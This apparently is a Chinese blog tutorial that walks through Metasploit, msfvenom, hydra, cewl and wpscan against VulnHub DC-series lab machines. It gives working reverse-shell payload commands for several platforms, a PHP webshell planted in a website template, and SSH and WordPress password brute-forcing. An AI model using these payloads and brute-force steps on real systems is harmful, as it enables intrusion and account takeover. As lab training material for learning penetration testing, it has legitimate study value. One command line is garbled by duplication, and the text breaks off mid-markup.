{"title":"常用工具的使用","uid":"e73809883b6a370bf3f1acefc7116657","slug":"tooluse(Commontools)","date":"2023-02-13T13:31:12.814Z","updated":"2023-08-06T08:00:47.219Z","comments":true,"path":"api/articles/tooluse(Commontools).json","keywords":null,"cover":"/img/27.jpg","content":"<p><code>记性不好记录一下</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"常用工具的使用\"><a href=\"#常用工具的使用\" class=\"headerlink\" title=\"常用工具的使用\"></a>常用工具的使用</h1><h2 id=\"1）msf\"><a href=\"#1）msf\" class=\"headerlink\" title=\"1）msf\"></a>1）msf</h2><h3 id=\"（1）msf基本使用\"><a href=\"#（1）msf基本使用\" class=\"headerlink\" title=\"（1）msf基本使用\"></a>（1）msf基本使用</h3><p><code>一个漏洞利用框架,对计算机软件漏洞进行攻击</code></p>\n<p><strong>这里以vulnhub dc1为例</strong></p>\n<p>终端输入<code>msfconsole</code>，进入msf界面，或者菜单也可以打开</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220830094506049.png\" alt=\"image-20220830094506049\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入search drupal，找一下有没有drupal可以利用的脚本\n&#x2F;*对于其他命令，可以用help查询*&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830094939297.png\" alt=\"image-20220830094939297\"></p>\n<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入use 1，进入编号1脚本的运行环境<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830095106784.png\" alt=\"image-20220830095106784\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入show options,查看脚本运行的所需要配置的项目<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830105519336.png\" alt=\"image-20220830105519336\"></p>\n<p><code>Required</code>是要求填的，yes是必填项，no是非必填项</p>\n<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入set RHOSTS 192.168.133.136<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110143969.png\" alt=\"image-20220830110143969\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">再输入run，运行脚本<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110303594.png\" alt=\"image-20220830110303594\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入shell，进入shell<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110551273.png\" alt=\"image-20220830110551273\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入whoami，查看当前的权限<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110648417.png\" alt=\"image-20220830110648417\"></p>\n<p>发现是个低权限的账号</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入ls，可以查看到当前的目录文件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110825217.png\" alt=\"image-20220830110825217\"></p>\n<p>但是一堆东西挤在一起，还是有些不太方便</p>\n<p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830110907408.png\" alt=\"image-20220830110907408\"></p>\n<h3 id=\"（2）msf后门生成模块\"><a href=\"#（2）msf后门生成模块\" class=\"headerlink\" title=\"（2）msf后门生成模块\"></a>（2）msf后门生成模块</h3><h4 id=\"普通生成\"><a href=\"#普通生成\" class=\"headerlink\" title=\"普通生成\"></a>普通生成</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom -p 有效载荷 -f 输出格式 -o 输出文件\n\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -f exe -o payload.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"编码生成\"><a href=\"#编码生成\" class=\"headerlink\" title=\"编码生成\"></a>编码生成</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost&#x3D;攻击机IP lport&#x3D;攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件\n\nmsfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.1 lport&#x3D;8888 -i 3 -e x86&#x2F;shikata_ga_nai -f exe -o payload.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"以DC-3举个例子\"><a href=\"#以DC-3举个例子\" class=\"headerlink\" title=\"*以DC-3举个例子\"></a>*以DC-3举个例子</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">输入msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;kali的ip LPORT&#x3D;4444 -f raw &gt; shell.php\n&#x2F;&#x2F;注意，LHOST是kali的ip<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903222910397.png\" alt=\"image-20220903222910397\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入ls<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903144052531.png\" alt=\"image-20220903144052531\"></p>\n<p>发现目录下生成了 <code>shell.php</code></p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220903223007361.png\" alt=\"image-20220903223007361\"></p>\n<p>然后在网站新建一个php文件</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220903221140645.png\" alt=\"image-20220903221140645\"></p>\n<p>然后把木马内容导入进去</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220903223039265.png\" alt=\"image-20220903223039265\"></p>\n<p>然后保存一下</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220903221238918.png\" alt=\"image-20220903221238918\"></p>\n<p>然后试试能不能访问木马</p>\n<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>\n<p>因为我们文件是在<code>/templates/protostar/less/</code>下上传的，所以访问</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;192.168.133.139&#x2F;templates&#x2F;protostar&#x2F;less&#x2F;1.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903221336853.png\" alt=\"image-20220903221336853\"></p>\n<p>看到&#x2F;*，看来是可以成功访问</p>\n<h5 id=\"msf利用木马\"><a href=\"#msf利用木马\" class=\"headerlink\" title=\"msf利用木马\"></a>msf利用木马</h5><p>然后用msf进行利用</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">先输入msfconsole，进入msf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">然后输入\nuse exploit&#x2F;multi&#x2F;handler\n\nset payload php&#x2F;meterpreter&#x2F;reverse_tcp\n进入我们利用msf制作的木马利用环境<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903220102252.png\" alt=\"image-20220903220102252\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入show options\n看看需要填写什么<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903220250819.png\" alt=\"image-20220903220250819\"></p>\n<p>看到LHOST监听的ip没有填写</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入set LHOST 192.168.133.140 &#x2F;&#x2F;kali的ip<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入run，运行，会卡住<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;192.168.133.139&#x2F;templates&#x2F;protostar&#x2F;1.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903223414089.png\" alt=\"image-20220903223414089\"></p>\n<p>后面操作不赘述</p>\n<h4 id=\"msfvenom-—list-archs\"><a href=\"#msfvenom-—list-archs\" class=\"headerlink\" title=\"msfvenom —list archs\"></a>msfvenom —list archs</h4><p>#查看支持的系统架构</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">aarch64, armbe, armle, cbea, cbea64, cmd, dalvik, firefox, java, mips, mips64, mips64le, mipsbe, mipsle, nodejs, php, ppc, ppc64, ppc64le, ppce500v2, python, r, ruby, sparc, sparc64, tty, x64, x86, x86_64, zarch<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"msfvenom-—list-platforms\"><a href=\"#msfvenom-—list-platforms\" class=\"headerlink\" title=\"msfvenom —list platforms\"></a>msfvenom —list platforms</h4><p>#查看支持系统平台</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">aix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, juniper, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom -l payload #列出所有可用的payload\n\nmsfvenom -l formats #列出所有的输出格式\n\nmsfvenom -l encrypt #列出所有的加密方式\n\nmsfvenom -l encoders #列出所有的编码器<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"常见生成格式\"><a href=\"#常见生成格式\" class=\"headerlink\" title=\"常见生成格式\"></a>常见生成格式</h4><h5 id=\"1、-Windows\"><a href=\"#1、-Windows\" class=\"headerlink\" title=\"1、 Windows\"></a>1、 Windows</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom --platform windows -a x86 -p windows&#x2F;meterpreter&#x2F;reverse_tcp -i 3 -e x86&#x2F;shikata_ga_nai -f exe -o payload.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"2、Linux\"><a href=\"#2、Linux\" class=\"headerlink\" title=\"2、Linux\"></a>2、Linux</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom --platform linux -a x86 -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp -f elf -o payload.elfxxxxxxxxxx msfvenom --platform linux -a x86 -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp -f elf -o payload.elf1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"3、Mac\"><a href=\"#3、Mac\" class=\"headerlink\" title=\"3、Mac\"></a>3、Mac</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom --platform osx -a x86 -p osx&#x2F;x86&#x2F;shell_reverse_tcp -f macho -o payload.macho<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"4、Android\"><a href=\"#4、Android\" class=\"headerlink\" title=\"4、Android\"></a>4、Android</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp -o payload.apk<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"5、Aspx\"><a href=\"#5、Aspx\" class=\"headerlink\" title=\"5、Aspx\"></a>5、Aspx</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom --platform windows-p windows&#x2F;meterpreter&#x2F;reverse_tcp -f aspx -o payload.aspx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"6、JSP\"><a href=\"#6、JSP\" class=\"headerlink\" title=\"6、JSP\"></a>6、JSP</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom --platform java -p java&#x2F;jsp_shell_reverse_tcp -f raw -o payload.jsp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"7、PHP\"><a href=\"#7、PHP\" class=\"headerlink\" title=\"7、PHP\"></a>7、PHP</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom -p php&#x2F;meterpreter_reverse_tcp -f raw -o payload.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"8、BASH\"><a href=\"#8、BASH\" class=\"headerlink\" title=\"8、BASH\"></a>8、BASH</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash -f raw -o shell.sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"9、Python\"><a href=\"#9、Python\" class=\"headerlink\" title=\"9、Python\"></a>9、Python</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp -f raw -o shell.py<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h4 id=\"Msfvenom常用命令参数\"><a href=\"#Msfvenom常用命令参数\" class=\"headerlink\" title=\"Msfvenom常用命令参数\"></a>Msfvenom常用命令参数</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">-l, --list &lt;type&gt; \n# 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等\n-p, --payload &lt;payload&gt; \n# 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取\n--list-options \n# 列出--payload &lt;value&gt; 的标准，高级和规避选项\n-f, --format &lt;format&gt; \n# 指定 Payload 的输出格式(使用 --list formats 列出)\n-e, --encoder &lt;encoder&gt; \n# 指定使用的 Encoder (使用 --list encoders 列出)\n--sec-name &lt;value&gt; \n# 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串\n--smallest \n# 使用所有可用的编码器生成最小的payload\n--encrypt &lt;value&gt; \n# 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)\n--encrypt-key &lt;value&gt; \n# 用于加密的密钥\n--encrypt-iv &lt;value&gt; \n# 加密的初始化向量\n-a, --arch &lt;arch&gt; \n# 指定目标系统架构(使用 --list archs 列出)\n--platform &lt;platform&gt; \n# 指定目标系统平台 (使用 --list platforms 列出)\n-o, --out &lt;path&gt; \n# 保存payload文件\n-b, --bad-chars &lt;list&gt; \n# 设置需要在 Payload 中避免出现的字符，如： &#39;\\x00\\xff&#39;\n-n, --nopsled &lt;length&gt; \n# 指定 nop 在 payload 中的数量\n-s, --space &lt;length&gt; \n# 设置未经编码的 Payload 的最大长度\n--encoder-space &lt;length&gt; \n# 编码后的 Payload 的最大长度\n-i, --iterations &lt;count&gt; \n# 设置 Payload 的编码次数\n-c, --add-code &lt;path&gt; \n# 指定包含一个额外的win32 shellcode文件\n-x, --template &lt;path&gt; \n# 指定一个特定的可执行文件作为模板\n-k, --keep \n# 保护模板程序的功能，注入的payload作为一个新的进程运行\n-v, --var-name &lt;value&gt; \n# 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）\n-t, --timeout &lt;second&gt; \n# 设置从STDIN读取payload的等待时间（默认为30,0为禁用）\n-h, --help \n# 帮助<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"2）hydra\"><a href=\"#2）hydra\" class=\"headerlink\" title=\"2）hydra\"></a>2）hydra</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>hydra是一个自动化的爆破工具,暴力破解弱密码,是一个支持众多协议的爆破工具</code></p></blockquote>\n<h3 id=\"1-爆破用户密码\"><a href=\"#1-爆破用户密码\" class=\"headerlink\" title=\"1.爆破用户密码\"></a>1.爆破用户密码</h3><p><strong>这里以vulnhub dc1为例</strong></p>\n<p>用了<code>hydra</code>[海德拉]工具，对<code>flag4</code>用户进行爆破</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">hydra -l flag4 -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz 192.168.133.136 -vV -f\n\n\n-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是\n用户所在的网站\n\n上面-p的文件是kali自带的密码包，当然也可以用其他的\n\n-s 端口<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830211739164.png\" alt=\"image-20220830211739164\"></p>\n<p>这里就看到<code>flag4</code>用户的密码被爆破出来，是<code>orange</code></p>\n<p>然后用<code>ssh</code>连接</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入ssh flag4@192.168.133.136\n然后yes\n然后输入密码：orange<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830211817515.png\" alt=\"image-20220830211817515\"></p>\n<h2 id=\"3）cewl\"><a href=\"#3）cewl\" class=\"headerlink\" title=\"3）cewl\"></a>3）cewl</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p> <code>Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。Cewl是通过ruby编写,通过爬取网站并提取独立的单词保存为字典,可以和John the Ripper等工具配合使用。</code></p>\n<p> <code>主要还是根据网站自身的关键词，然后生成的字典，比如cewl，flag等等</code></p></blockquote>\n<p><strong>这里以vulnhub dc2为例</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-w等同于&gt;   &#x2F;&#x2F;写入\n-m n       &#x2F;&#x2F;至少生成的长度为n，默认是3\n-d x       &#x2F;&#x2F;生成更大的字典，默认x&#x3D;2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>我们用<code>cewl</code>试试生成字典</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入cewl http:&#x2F;&#x2F;dc-2&#x2F; &gt;pass.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831221031390.png\" alt=\"image-20220831221031390\"></p>\n<p>目录下就会生成<code>pass.txt</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入cat pass.txt，查看内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831221151099.png\" alt=\"image-20220831221151099\"></p>\n<p>发现是生成对应网站的密码字典</p>\n<h2 id=\"4）wpscan\"><a href=\"#4）wpscan\" class=\"headerlink\" title=\"4）wpscan\"></a>4）wpscan</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p></blockquote>\n<p><strong>这里以vulnhub dc2为例</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan -url http:&#x2F;&#x2F;dc-2 -e u\n\n-e u    &#x2F;&#x2F;枚举用户信息\n\nwpscan -url xx -P xx -U xx\n-P passwdspath  &#x2F;&#x2F;密码字典路径，或者直接写\n-U userspath    &#x2F;&#x2F;用户名字典路径，或者直接写<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入wpscan --url http:&#x2F;&#x2F;dc-2 -e u<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831223359965.png\" alt=\"image-20220831223359965\"></p>\n<p>然后往下看用户名</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220831223432802.png\" alt=\"image-20220831223432802\"></p>\n<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入vi un.txt,把admin jerry tom复制进去<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831223714569.png\" alt=\"image-20220831223714569\"></p>\n<p>然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">输入wpscan --url http:&#x2F;&#x2F;dc-2 -P pass.txt -U un.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831223950721.png\" alt=\"image-20220831223950721\"></p>\n<p>稍微等一会</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220831224205560.png\" alt=\"image-20220831224205560\"></p>\n<p>admin用户密码没有找到，应该是最高权限的账号</p>\n<p>但是jerry和tom用户的密码知道了</p>\n<h2 